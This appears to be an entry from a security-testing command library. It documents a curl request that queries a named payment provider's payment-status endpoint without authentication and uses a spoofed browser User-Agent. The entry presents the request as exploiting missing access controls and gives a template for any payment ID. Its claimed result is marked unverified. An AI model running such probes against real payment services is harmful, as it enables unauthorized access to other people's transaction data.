---
id: cmd-omise-get-status-001
data: >-
  curl -X GET
  "https://api.omise.co/payments/paym_test_5rjz482tky43reoil9f/status" -H
  "Sec-Ch-Ua: \"\" " -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X
  10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124
  Safari/537.36" -H "Accept: */*" -H "Referer: https://api.omise.co/" --http2
tags:
  - api
  - recon
  - access-control
type: command
output: '{"processed":true}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.769Z'
verified: false
validated: true
submitted: true
---
# get-omise-payment-status

## Command

```bash
curl -X GET "https://api.omise.co/payments/paym_test_5rjz482tky43reoil9f/status" \
  -H "Sec-Ch-Ua: \"\" " \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
  -H "Accept: */*" \
  -H "Referer: https://api.omise.co/" \
  --http2
```

## Description

This command uses curl to send an unauthenticated GET request to the Omise API's payment status endpoint, exploiting the lack of access controls to retrieve transaction status details. Use it during API security testing to check for anonymous access vulnerabilities in payment systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL path | Endpoint with payment ID (e.g., /payments/{payment_id}/status) | Yes |
| `-H "Sec-Ch-Ua: \"\" "` | Client hint header for compatibility | No |
| `-H "User-Agent: ..."` | Browser user agent to mimic legitimate traffic | No |
| `-H "Accept: */*"` | Accepts any response type | No |
| `-H "Referer: ..."` | Referral header | No |
| `--http2` | Enables HTTP/2 protocol | Yes (for matching the vuln) |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.omise.co/payments/paym_test_5rjz482tky43reoil9f/status" --http2
```

### Advanced Usage

```bash
curl -X GET "https://api.omise.co/payments/{PAYMENT_ID}/status" \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "Accept: application/json" \
  --http2 -v
```

## Expected Output

HTTP/2 200 OK response with Content-Type: application/json and body like {"processed":true}, confirming the payment status without authentication.

## Related

- [[Related Procedure|procedures/Retrieve-Omise-Payment-Status-Anonymously]]
